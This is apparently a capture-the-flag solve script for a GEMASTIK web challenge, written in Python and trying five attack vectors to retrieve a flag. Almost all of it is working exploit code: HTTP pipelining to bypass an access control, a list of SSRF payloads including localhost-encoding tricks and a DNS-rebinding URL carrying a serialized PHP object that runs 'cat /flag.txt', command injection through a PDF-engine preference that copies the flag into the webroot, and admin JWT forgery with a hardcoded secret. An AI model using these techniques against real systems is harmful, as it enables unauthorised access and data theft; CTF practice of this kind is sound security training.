#!/usr/bin/env python3
import sys
import socket
import re
import base64
import json
import hmac
import hashlib
import time
import random
import requests

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ip")
        print(f"Example: {sys.argv[0]} 127.0.0.1")
        sys.exit(1)

    PORT = 22000
    GATEWAY_PORT = PORT + 90  # Ops gateway port
    target_ip = sys.argv[1]
    BASE_URL = f"http://{target_ip}:{PORT}"
    s = requests.Session()
    flag = ""

    def log(msg):
        print(f"[*] {msg}", flush=True)

    def extract_flag(text):
        if not text:
            return ""
        match = re.search(r"GEMASTIK\{[^}]+\}", text)
        if match:
            return match.group(0)
        match_alt = re.search(r"(?:FLAG|GEMASTIK)\{[^}]+\}", text, re.IGNORECASE)
        if match_alt:
            return match_alt.group(0)
        return ""

    def forge_admin_jwt(secret):
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "id": random.randint(1000, 9999),
            "role": "admin",
            "username": f"admin_{random.randint(100, 999)}",
            "iat": int(time.time()),
            "jti": hex(random.getrandbits(64))[2:]
        }
        
        def base64url_encode(data):
            if isinstance(data, str):
                data = data.encode('utf-8')
            return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
            
        enc_header = base64url_encode(json.dumps(header))
        enc_payload = base64url_encode(json.dumps(payload))
        
        signing_input = f"{enc_header}.{enc_payload}".encode('utf-8')
        signature = hmac.new(secret.encode('utf-8'), signing_input, hashlib.sha256).digest()
        enc_sig = base64url_encode(signature)
        
        return f"{enc_header}.{enc_payload}.{enc_sig}"

    # =========================================================================
    # VECTOR 1: Ops Gateway HTTP Pipelining ACL Bypass
    # =========================================================================
    log("Trying Vector 1: Ops Gateway HTTP Pipelining (/internal/admin/ops-flag)...")
    try:
        payload = (
            b"GET /health HTTP/1.1\r\nHost: localhost\r\n\r\n"
            b"GET /internal/admin/ops-flag HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, GATEWAY_PORT))
        sock.sendall(payload)
        resp_data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp_data += chunk
        sock.close()
        
        flag = extract_flag(resp_data.decode("latin1", errors="ignore"))
        if flag:
            log(f"Found flag via Vector 1! Flag: {flag}")
            return
    except Exception as e:
        log(f"Vector 1 failed: {e}")

    # =========================================================================
    # VECTOR 2: Authenticated Access as Seeded User 'alice' (Group 1 Message Leak)
    # =========================================================================
    log("Trying Vector 2: Logging in as seeded user 'alice' to read Group 1 messages...")
    token = None
    try:
        login_res = s.post(f"{BASE_URL}/graphql", json={
            "query": "mutation Login($u: String!,$p: String!) { login(username: $u, password:$p) }",
            "variables": {"u": "alice", "p": "alicepassword"}
        }, timeout=5)
        res_json = login_res.json()
        token = (res_json.get("data") or {}).get("login")
    except Exception as e:
        log(f"Alice login failed: {e}")

    headers = {"Authorization": f"Bearer {token}"} if token else {}

    if token:
        try:
            group_res = s.post(f"{BASE_URL}/graphql", json={
                "query": "query GetGroup($id: ID!) { group(id:$id) { id name messages { id body } } }",
                "variables": {"id": "1"}
            }, headers=headers, timeout=5)
            
            data_str = group_res.text
            flag = extract_flag(data_str)
            if flag:
                log(f"Found flag via Vector 2 (Alice Group 1 query)! Flag: {flag}")
                return
        except Exception as e:
            log(f"Vector 2 group query failed: {e}")

    # =========================================================================
    # VECTOR 3: SSRF via GraphQL linkPreview (Bypasses & DNS Rebinding/Redirects)
    # =========================================================================
    if not flag and token:
        log("Trying Vector 3: SSRF via GraphQL linkPreview (with bypass & rebinding payloads)...")
        ssrf_payloads = [
            "http://127.0.0.1:4000/internal/admin/ops-flag",
            "http://localhost:4000/internal/admin/ops-flag",
            "http://[::1]:4000/internal/admin/ops-flag",
            "http://2130706433:4000/internal/admin/ops-flag",  # Decimal representation of 127.0.0.1
            "http://0x7f000001:4000/internal/admin/ops-flag", # Hex representation
            "http://127.1:4000/internal/admin/ops-flag",        # Shortened IP notation
            f"http://{target_ip}:{PORT}/api/redirect?url=http://127.0.0.1:4000/internal/admin/ops-flag",
            # Direct rebinding vector targeting admin.php
            "http://7f000001.08080808.rbndr.us:9000/admin.php?token=itk_devtoken_do_not_use_in_prod&action=avatar_config&payload=TzoxMjoiQXZhdGFyQ29uZmlnIjoxOntzOjEyOiJjYWNoZVdhcm1DbWQiO3M6MTM6ImNhdCAvZmxhZy50eHQiO30%3D"
        ]

        for url_target in ssrf_payloads:
            try:
                log(f"Testing SSRF target: {url_target}")
                res = s.post(f"{BASE_URL}/graphql", json={
                    "query": "mutation LinkPreview($url: String!) { linkPreview(url:$url) { status snippet } }",
                    "variables": {"url": url_target}
                }, headers=headers, timeout=5)
                json_res = res.json()
                
                data = json_res.get("data") or {}
                link_preview = data.get("linkPreview") or {}
                snippet = link_preview.get("snippet", "")
                
                flag = extract_flag(snippet)
                if flag:
                    log(f"Found flag via Vector 3 ({url_target})! Flag: {flag}")
                    return
            except Exception as e:
                log(f"SSRF payload {url_target} failed: {e}")

    # =========================================================================
    # VECTOR 4: RCE via PDF Report Generator Preferences (With Webroot Exfil)
    # =========================================================================
    if not flag and token:
        log("Trying Vector 4: RCE via PDF Report Generator with webroot exfiltration...")
        try:
            prefs_payload = '{"pdfEngine": "sh -c \'cat /flag.txt > public/flag.txt\' #"}'
            s.post(f"{BASE_URL}/graphql", json={
                "query": "mutation SetPrefs($p: String!) { setPrefs(prefsJson:$p) }",
                "variables": {"p": prefs_payload}
            }, headers=headers, timeout=5)

            s.post(f"{BASE_URL}/graphql", json={
                "query": "mutation { exportMyDataPdf }"
            }, headers=headers, timeout=5)
            
            exfil_res = s.get(f"{BASE_URL}/flag.txt", timeout=5)
            flag = extract_flag(exfil_res.text)
            if flag:
                log(f"Found flag via Vector 4 webroot exfiltration! Flag: {flag}")
                return
        except Exception as e:
            log(f"Vector 4 failed: {e}")

    # =========================================================================
    # VECTOR 5: Forged Admin JWT against /api/admin/secret (Hardcoded Secret Key)
    # =========================================================================
    if not flag:
        log("Trying Vector 5: Forging Admin JWT for /api/admin/secret...")
        try:
            hardcoded_secret = "dev-secret-change-me-before-prod"
            forged_token = forge_admin_jwt(hardcoded_secret)
            
            admin_res = s.get(f"{BASE_URL}/api/admin/secret", headers={
                "Authorization": f"Bearer {forged_token}"
            }, timeout=5)
            
            flag = extract_flag(admin_res.text)
            if flag:
                log(f"Found flag via Vector 5 (Forged Admin JWT)! Flag: {flag}")
                return
        except Exception as e:
            log(f"Vector 5 failed: {e}")

    if flag:
        log(f"Final Flag: {flag}")
    else:
        log("All vectors exhausted. Flag not found.")

if __name__ == "__main__":
    main()